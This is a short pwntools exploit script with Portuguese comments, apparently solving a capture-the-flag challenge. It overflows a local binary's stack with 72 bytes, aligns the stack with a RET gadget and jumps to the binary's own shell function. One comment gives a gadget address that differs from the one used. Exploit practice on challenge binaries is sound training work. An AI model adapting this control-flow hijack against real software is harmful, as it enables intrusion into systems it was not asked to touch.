#!/usr/bin/env python3
from pwn import *

# Configurações
elf = context.binary = ELF('./fortify_pwn', checksec=False)
p = process('./fortify_pwn')

# 1. Resolver Endereços
# Usamos o valor fixo do seu nm ou deixamos o pwntools achar
shell_addr = elf.sym['shell']

# Gadget RET para alinhar a pilha em 16 bytes (essencial para system/execve)
# Baseado no seu objdump anterior: 0x40101a
ret_gadget = 0x401244 

# 2. Offset encontrado pelo GDB
# cyclic_find(0x6161617461616173) -> 72
offset = 72

log.info(f"Offset encontrado: {offset}")
log.info(f"Endereço shell:    {hex(shell_addr)}")

# 3. Construir Payload
# [72 bytes de lixo] + [RET para alinhamento] + [Endereço da Shell]
payload = b"A" * offset
payload += p64(ret_gadget)
payload += p64(shell_addr)

# 4. Disparar
log.info("Enviando payload...")
p.sendafter(b"input: ", payload)

# 5. Interação
p.interactive()
